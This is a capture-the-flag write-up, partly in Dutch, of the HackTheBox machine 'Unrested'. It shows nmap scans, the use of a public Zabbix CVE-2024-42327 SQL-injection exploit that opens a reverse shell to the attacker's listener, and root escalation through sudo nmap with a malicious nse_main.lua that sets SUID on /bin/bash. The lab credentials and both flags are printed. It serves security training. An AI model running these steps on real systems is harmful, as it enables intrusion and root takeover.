
![[Pasted image 20250306132238.png]]

# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- 10.129.231.176
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 13:57 CET
Nmap scan report for unrested.htb (10.129.231.176)
Host is up (0.026s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10050/tcp open  zabbix-agent
10051/tcp open  zabbix-trapper

Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds
```
### Detailed port scan

At the gedatialized port scan go to get more information from the services dien are open the ip address.

```
nmap -p22,80,10050,10051 -sCV 10.129.231.176 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 13:58 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Initiating Ping Scan at 13:58
Scanning 10.129.231.176 [4 ports]
Completed Ping Scan at 13:58, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:58
Scanning unrested.htb (10.129.231.176) [4 ports]
Discovered open port 22/tcp on 10.129.231.176
Discovered open port 80/tcp on 10.129.231.176
Discovered open port 10051/tcp on 10.129.231.176
Discovered open port 10050/tcp on 10.129.231.176
Completed SYN Stealth Scan at 13:58, 0.06s elapsed (4 total ports)
Initiating Service scan at 13:58
Scanning 4 services on unrested.htb (10.129.231.176)
Completed Service scan at 13:58, 6.64s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.231.176.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 5.16s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.49s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Nmap scan report for unrested.htb (10.129.231.176)
Host is up, received echo-reply ttl 63 (0.024s latency).
Scanned at 2025-03-06 13:58:39 CET for 12s

PORT      STATE SERVICE             REASON         VERSION
22/tcp    open  ssh                 syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp    open  http                syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
10050/tcp open  tcpwrapped          syn-ack ttl 63
10051/tcp open  ssl/zabbix-trapper? syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
           Raw packets sent: 8 (328B) | Rcvd: 7 (284B)
```

If we go to the webpage can you see that we will come on a login page of the zabbix monitoring tool. The credentials to login on the monitoring tool where allready provided by HTB. So i will use the following credentials to login on the monitoring tool.

| Username | Password     |
| -------- | ------------ |
| matthew  | 96qzn0h2e1k3 |
As you can see below are we now logged in as the user matthew on Zabbix.

![[Pasted image 20250306133004.png]]

There i can see that fronted of Zabbix is not updated and that Zabbix is running on version 7.0.0

![[Pasted image 20250306133344.png]]

Nu ben ik dus gaan zoeken naar exploit voor deze versie en hierbij heb ik de volgende exploit gevonden. https://github.com/BridgerAlderson/Zabbix-CVE-2024-42327-SQL-Injection-RCE.
Ik ben de exploit gaan uitvoeren, Ik heb een listener gestart heb dus een connectie gekregen met de zabbix server.

```
┌──(kali㉿kali)-[~/HTB/Unrested/Zabbix-CVE-2024-42327-SQL-Injection-RCE]
└─$ python exploit.py         

        _______    ________    ___   ____ ___  __ __        __ __ ___  ________  _____
       / ____/ |  / / ____/   |__ \ / __ \__ \/ // /       / // /|__ \|__  /__ \/__  /
      / /    | | / / __/________/ // / / /_/ / // /_______/ // /___/ / /_ <__/ /  / / 
     / /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/__  __/ __/___/ / __/  / /  
     \____/  |___/_____/    /____/\____/____/ /_/          /_/ /____/____/____/ /_/   
    
API URL: http://unrested.htb/zabbix/api_jsonrpc.php
username: matthew
password: 96qzn0h2e1k3
lhost (local ip address for reverse shell): 10.10.16.31
lport (port number for reverse shell): 4444
Authenticating...
Login successful! Auth token: b69c112fa3fa8502c73610ee04122a32
Starting data extraction...
Extracting admin session: 2bc515c26b8ce1f49646c8f4c652ae03
Admin session extracted: 2bc515c26b8ce1f49646c8f4c652ae03
host.get response: {'jsonrpc': '2.0', 'result': [{'hostid': '10084', 'host': 'Zabbix server', 'interfaces': [{'interfaceid': '1'}]}], 'id': 1}
Reverse shell command executed successfully.
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                                     
listening on [any] 4444 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.231.176] 44204
bash: cannot set terminal process group (2003): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@unrested:/$
```

Nu ben ik dus gaan kijken in de home folder bij de user matthew en daar heb je dan eerste flag, de user flag.

`user flag = ba1abd16fcf4ce6f71e574d459a22c65`

```
zabbix@unrested:/$ cd home
cd home
zabbix@unrested:/home$ ls
ls
matthew
zabbix@unrested:/home$ cd matt
cd matthew/
zabbix@unrested:/home/matthew$ ls
ls
user.txt
zabbix@unrested:/home/matthew$ cat user.txt
cat user.txt
ba1abd16fcf4ce6f71e574d459a22c65
zabbix@unrested:/home/matthew$
```

From there i did the sudo -l command to see if i can execute a command with the sudo rights without knowing the password. 

Then i have executed the following code. The --datadir option allows you to specify a custom directory where default scripts and other essential nmap files are stored. By default, this directory is set to /usr/share/nmap.

One key file in this directory is nse_main.lua, the default script file that can be executed using the -sC flag. To exploit this, a new file can be created at /tmp/nse_main.lua containing the command os.execute("chmod 4755 /bin/bash"). When localhost is scanned with the -sC option enabled, this sets /bin/bash with the SUID bit. As a result, a shell can be spawned with the effective UID of the root user.

```
zabbix@unrested:/$ echo 'os.execute("chmod 4755 /bin/bash")' > /tmp/nse_main.lua
<xecute("chmod 4755 /bin/bash")' > /tmp/nse_main.lua
zabbix@unrested:/$ sudo /usr/bin/nmap --datadir=/tmp -sC localhost
sudo /usr/bin/nmap --datadir=/tmp -sC localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-06 14:18 UTC
nmap.original: nse_main.cc:619: int run_main(lua_State*): Assertion `lua_isfunction(L, -1)' failed.
Aborted
zabbix@unrested:/$ /bin/bash -p
/bin/bash -p
```



As you can see do we have now the permissions to see the root.txt file.

```
bash-5.1# id

uid=114(zabbix) gid=121(zabbix) euid=0(root) groups=121(zabbix)
bash-5.1# cd /root
cd /root
bash-5.1# ls
ls
root.txt
bash-5.1# cat root.txt
cat root.txt
f6b9476b284711f6dfb59a8053fcec93
```

`root flag = f6b9476b284711f6dfb59a8053fcec93`

![[Pasted image 20250306151931.png]]